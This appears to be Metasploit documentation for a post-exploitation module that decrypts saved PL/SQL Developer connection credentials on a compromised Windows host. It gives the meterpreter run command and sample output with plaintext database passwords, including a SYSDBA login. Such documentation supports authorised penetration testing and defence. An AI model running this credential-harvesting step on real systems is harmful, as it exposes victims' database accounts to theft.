## Vulnerable Application

This module can decrypt the histories and connection credentials of PL/SQL Developer,
and passwords are available if the user chooses to remember.

Note: This module can only decrypt the passwords of PL/SQL Developer 14 and earlier versions.
The passwords of PL/SQL Developer 15 and later versions are encrypted with a new algorithm,
which is not supported by this module.

Analysis of encryption algorithm [here](https://adamcaudill.com/2016/02/02/plsql-developer-nonexistent-encryption/).
You can find its official website [here](https://www.allroundautomations.com/products/pl-sql-developer/).

## Verification Steps

  1. Download and install PL/SQL Developer 14 or earlier versions.
  2. (Optional) Change the PL/SQL Developer preference to save the passwords.
  3. Use PL/SQL Developer to log in to oracle databases. Or add a connection in PL/SQL Developer manually.
  4. Get a `meterpreter` session on a Windows host.
  5. Do: `run post/windows/gather/credentials/plsql_developer`
  6. The username, password, SID of connections will be printed.

## Options

 **PLSQL_PATH**

  - Specify the path of PL/SQL Developer

## Scenarios

```
meterpreter > run windows/gather/credentials/plsql_developer

[*] Gather PL/SQL Developer Histories and Connections on WIN-XXXXXXXXXXX
[*] Decrypting C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
[*] Decrypting C:\Users\Administrator\AppData\Roaming\PLSQL Developer 14\Preferences\Administrator\user.prefs
PL/SQL Developer Histories and Credentials
==========================================

DisplayName           Username  Database  ConnectAs  Password         FilePath
-----------           --------  --------  ---------  --------         --------
                      user      server    Normal     password         C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
                      sys       ORCL      SYSDBA     oracle           C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
                      test1     ORCL      Normal                      C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
                      test2     ORCL      Normal     password2        C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
Imported History/ASD  eee       ttt       Normal     asdfg            C:\Users\Administrator\AppData\Roaming\PLSQL Developer 14\Preferences\Administrator\user.prefs

[+] Passwords stored in: C:/Users/Administrator/.msf4/loot/20231108010519_default_172.18.14.79_host.plsql_devel_637423.txt
meterpreter >
```
